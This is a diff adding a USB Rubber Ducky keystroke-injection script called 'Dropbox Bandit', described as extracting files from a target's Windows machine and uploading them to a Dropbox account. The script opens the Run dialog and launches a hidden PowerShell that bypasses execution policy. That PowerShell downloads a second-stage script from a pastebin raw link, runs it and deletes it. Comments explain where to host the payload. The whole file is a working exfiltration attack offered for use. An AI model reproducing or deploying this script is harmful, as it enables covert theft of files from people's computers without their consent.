@@ -1,0 +1,26 @@
+REM Title: Dropbox Bandit
+REM Author: Factor (github.com/Factor101)
+REM Description: Extracts files from a specific location on a target's machine and uploads them to dropbox account
+REM Target: Windows 10/11 (Powershell)
+REM Version: 1.0
+REM Category: Exfiltration
+
+REM Inital Delay
+DELAY 500
+
+REM Open CMD
+GUI r
+REM Delay to allow window to open
+DELAY 100
+REM Launch hidden powershell window to execute our script
+
+REM Upload your ex.ps1 payload to pastebin or dropbox (or another website, if you want) and copy the URL here
+REM if you're using dropbox ensure the link ends with ?dl=1 and not ?dl=0
+REM if you're using pastebin ensure you're using the "raw" link e.g. http://pastebin.com/raw/<paste_id>
+REM                                                                        --------- replace me! ----------
+STRING powershell -w h -NoP -NonI -Exec Bypass "$e=$env:TMP+'\ex.ps1';iwr https://pastebin.com/raw/<paste_id> -O $e;iex $e;rm $e"
+DELAY 200
+ENTER
+
+REM Presses CAPSLOCK to indicate that payload is finished and you can remove the Ducky
+CAPSLOCK
